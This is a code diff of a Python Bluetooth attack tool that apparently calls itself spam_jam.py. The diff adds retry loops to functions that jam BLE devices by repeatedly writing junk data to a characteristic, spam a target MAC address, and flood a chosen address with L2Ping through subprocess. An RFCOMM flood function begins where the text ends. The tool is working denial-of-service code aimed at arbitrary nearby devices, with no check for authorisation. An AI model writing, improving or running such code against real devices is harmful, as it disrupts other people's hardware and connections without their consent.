@@ -28,7 +28,7 @@ class BLESpam(DefaultDelegate):
     def handleNotification(self, cHandle, data):
         print(f"🔔 Notification from BLE device: {data}")
 
-# 🚀 BLE Spamming with Smart Address Type Detection!
+# 🚀 BLE Spamming
 def spam_ble():
     target_mac = input("💜 Enter target BLE MAC address: ")
     print(f"🚀 Spamming device {target_mac} 💥💜")
@@ -55,50 +55,54 @@ def spam_ble():
             print(f"⚠️ Error: {e}")
             break
 
-# 🎯 BLE Jamming Function (FULLY FIXED SCAN!)
+# 🎯 BLE Jamming (FULLY FIXED!)
 def jam_ble():
     print("🔎 Resetting BLE scan before jamming...")
-    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # 💥 Reset before scan!
-    
-    print("🔎 Scanning for BLE devices to jam 📡")
-    scanner = Scanner()
-    
-    try:
-        devices = scanner.scan(10.0)
-    except BTLEException as e:
-        print(f"⚠️ BLE Scan Failed! Error: {e}")
-        return
+    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    if not devices:
-        print("⚠️ No BLE devices found. Try again!")
-        return
+    while True:
+        print("🔎 Scanning for BLE devices to jam 📡")
+        scanner = Scanner()
 
-    for idx, device in enumerate(devices):
-        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
+        try:
+            devices = scanner.scan(10.0)
+        except BTLEException as e:
+            print(f"⚠️ BLE Scan Failed! Error: {e}")
+            continue
 
-    try:
-        device_idx = int(input("💜 Enter the index of the device to jam: "))
-        target_device = devices[device_idx].addr
-    except (ValueError, IndexError):
-        print("⚠️ Invalid index.")
-        return
+        if not devices:
+            print("⚠️ No BLE devices found. Try again!")
+            continue
 
-    print(f"💥 Jamming device {target_device} 🚀💜")
-    try:
-        peripheral = Peripheral(target_device)
-        while True:
-            junk_data = b'\x00\xFF' * 50
-            peripheral.writeCharacteristic(0x000b, junk_data, withResponse=False)
-            print(f"🚀 Jammed {target_device} with noise 💜💥")
-            time.sleep(0.1)
-    except BTLEException as e:
-        print(f"⚠️ Failed to jam {target_device}: {e}")
+        for idx, device in enumerate(devices):
+            print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
 
-# 🔎 Bluetooth Device Scanner (FULLY FIXED!)
+        try:
+            device_idx = int(input("💜 Enter the index of the device to jam: "))
+            target_device = devices[device_idx].addr
+        except (ValueError, IndexError):
+            print("⚠️ Invalid index.")
+            continue
+
+        print(f"💥 Jamming device {target_device} 🚀💜")
+        try:
+            peripheral = Peripheral(target_device)
+            while True:
+                junk_data = b'\x00\xFF' * 50
+                peripheral.writeCharacteristic(0x000b, junk_data, withResponse=False)
+                print(f"🚀 Jammed {target_device} with noise 💜💥")
+                time.sleep(0.1)
+        except BTLEException as e:
+            print(f"⚠️ Failed to jam {target_device}: {e}")
+            retry = input("💜 Try another device? (y/n): ").strip().lower()
+            if retry != 'y':
+                break
+
+# 🔎 Bluetooth Scanner
 def scan_bluetooth():
     print("🔎 Resetting BLE scan before scanning for devices...")
-    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # 💥 Reset before scan!
-    
+    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
     print("🔎 Scanning for Bluetooth devices... (This may take a few seconds)\n")
 
     try:
@@ -117,16 +121,25 @@ def scan_bluetooth():
 
     print("\n✅ Scan complete!\n")
 
-# 💥 CUSTOM L2PING FLOOD ATTACK
+# 💥 CUSTOM L2PING FLOOD ATTACK (Now with Retry Option!)
 def l2ping_attack():
-    addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
+    while True:
+        addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
 
-    if os.geteuid() != 0:
-        print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
-        return
+        if os.geteuid() != 0:
+            print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
+            return
 
-    print(f"💥 Sending L2Ping flood to {addr}")
-    subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
+        print(f"💥 Sending L2Ping flood to {addr}")
+        try:
+            subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
+            print("✅ L2Ping attack successful!")
+            break
+        except subprocess.CalledProcessError:
+            print(f"⚠️ Failed to send L2Ping to {addr}. The device may be offline or rejecting pings.")
+            retry = input("💜 Try a different device? (y/n): ").strip().lower()
+            if retry != 'y':
+                break
 
 # ✅ RFCOMM FLOOD FUNCTION!
 def rfcomm_flood():
